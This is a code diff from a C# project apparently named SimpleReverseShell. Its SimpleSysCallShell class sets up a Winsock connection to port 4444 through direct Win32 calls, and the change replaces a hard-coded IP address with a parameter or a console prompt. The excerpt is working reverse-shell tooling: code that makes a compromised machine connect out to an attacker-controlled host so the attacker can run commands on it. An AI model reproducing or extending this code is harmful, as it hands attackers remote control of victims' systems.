@@ -5,13 +5,14 @@
 ///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 namespace SimpleReverseShell
 {
+  using System.Net.Security;
   using System.Net.Sockets;
   using System.Runtime.InteropServices;
   using Win32Imports;
 
   internal class SimpleSysCallShell : DllImportsBase
   {
-    public void Start()
+    public void Start(string serverIP)
     {
       var wsa = new WSAData();
       var statusCode = WSAStartup((ushort)2.2, wsa);
@@ -23,7 +24,13 @@ namespace SimpleReverseShell
       sockAddrIn.sin_port = htons(4444);
       Helpers.PrintLastError(nameof(htons));
 
-      sockAddrIn.sin_addr.S_addr = inet_addr("192.168.0.187");
+      if (string.IsNullOrWhiteSpace(serverIP))
+      {
+        Console.WriteLine("Enter server IP: ");
+        serverIP = Console.ReadLine();
+      }
+
+      sockAddrIn.sin_addr.S_addr = inet_addr(serverIP);
       Helpers.PrintLastError(nameof(inet_addr));
 
       var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
